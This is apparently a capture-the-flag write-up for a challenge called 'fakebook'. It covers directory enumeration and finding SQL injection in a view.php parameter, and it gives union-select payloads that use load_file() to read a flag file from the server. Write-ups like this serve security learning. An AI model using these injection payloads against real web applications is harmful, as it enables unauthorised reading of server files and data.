# fakebook

![Screenshot from 2021-08-01 12-52-50](https://user-images.githubusercontent.com/87865134/127760908-1acaaa30-6ab8-4843-85b2-09161dfac3c7.png)
![Screenshot from 2021-08-01 12-53-11](https://user-images.githubusercontent.com/87865134/127760913-84698e9e-9ca1-4106-bde6-e0363f923068.png)
![Screenshot from 2021-08-01 12-53-29](https://user-images.githubusercontent.com/87865134/127760915-405e7d7c-352f-4413-ac07-37fae8fe962f.png)
![Screenshot from 2021-08-01 12-53-44](https://user-images.githubusercontent.com/87865134/127760917-2ece6083-fbd8-44ec-9343-2c6d6c9a74d5.png)

## 1. Information gathering
### - Use `dirsearch` to find hidden files
  ![Screenshot from 2021-08-01 12-59-38](https://user-images.githubusercontent.com/87865134/127761023-ee6b3a67-f287-40f8-90e6-3f2516d3ce12.png)
  
  - flag maybe in file flag.php

## 2. Find vulnerabilities
 - **url:** `http://111.200.241.244:54769/view.php?no=1` get informations of user by `no` parameter      
 
 ![Screenshot from 2021-08-01 12-53-44](https://user-images.githubusercontent.com/87865134/127760917-2ece6083-fbd8-44ec-9343-2c6d6c9a74d5.png)
  
    - => Maybe SQLi  
  
 - **test:**   
 ```
 /view.php?no=-1'
 ``` 
 
 ![Screenshot from 2021-08-01 13-42-10](https://user-images.githubusercontent.com/87865134/127761902-0c3cb3b6-0d7d-4196-8ced-af97ecc93332.png)
  
  ```
  /view.php?no=2 union/**/select 1, 2, null, null #
  ```  
  
  ![Screenshot from 2021-08-01 13-46-31](https://user-images.githubusercontent.com/87865134/127762004-7ed32751-110a-463a-a197-aeb009a58cd0.png)

  
   > found SQLi

## 3. Exploit vulnerabilities
  - use `load_file()` read file `/var/www/html/flag.php`  to get flag
  ```
  /view.php?no=2 union/**/select 1, load_file("/var/www/html/flag.php"), null, null #
  ```
  
  ![Screenshot from 2021-08-01 13-49-50](https://user-images.githubusercontent.com/87865134/127762060-87836ea0-1572-4497-b7fd-551953bdb52c.png)

### - Description:
  > **category:** SQL Injection
